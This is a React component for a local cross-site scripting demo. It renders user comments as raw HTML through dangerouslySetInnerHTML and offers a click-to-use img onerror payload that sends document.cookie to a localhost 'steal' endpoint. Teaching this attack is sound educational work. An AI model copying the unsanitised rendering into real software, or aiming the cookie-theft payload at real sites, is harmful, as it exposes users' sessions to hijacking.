import React, { useState, useEffect } from "react";
import axios from "axios";
import "./App.css";

function App() {
  const [comments, setComments] = useState([]);
  const [newComment, setNewComment] = useState("");

  // Set up some example cookies
  useEffect(() => {
    document.cookie = "userID=12345; path=/";
    document.cookie = "sessionToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/";
    document.cookie = "userPreferences=theme:dark; path=/";
  }, []);

  const fetchComments = async () => {
    const response = await axios.get("http://localhost:5000/comments");
    setComments(response.data);
  };

  const addComment = async () => {
    await axios.post("http://localhost:5000/comments", { text: newComment });
    setNewComment("");
    fetchComments();
  };

  useEffect(() => {
    fetchComments();
  }, []);

  return (
    <div className="container">
      <div className="heading-container">
        <h1>Cross-Site Scripting (XSS) Demo</h1>
        <p className="subtitle">Shows how malicious scripts can be injected</p>
      </div>

      {/* Example XSS payload to test */}
      <div className="input-container">
        <div className="input-label">Example XSS Payload (click to use)</div>
        <code onClick={() => setNewComment('<img src="x" onerror="fetch(`http://localhost:5000/steal?cookies=${encodeURIComponent(document.cookie)}`)">')}>
          {'<img src="x" onerror="fetch(`http://localhost:5000/steal?cookies=${encodeURIComponent(document.cookie)}`)">'}
        </code>
      </div>

      <div className="input-container">
        <input
          id="post-input"
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          placeholder="Add a comment"
          className="input"
        />
        <button onClick={addComment} className="button">
          Submit
        </button>
      </div>

      <div className="comments-section">
        {comments.map((comment, index) => (
          <div
            key={index}
            className="comment-box"
            dangerouslySetInnerHTML={{ __html: comment.text }}
          />
        ))}
      </div>
    </div>
  );
}

export default App;
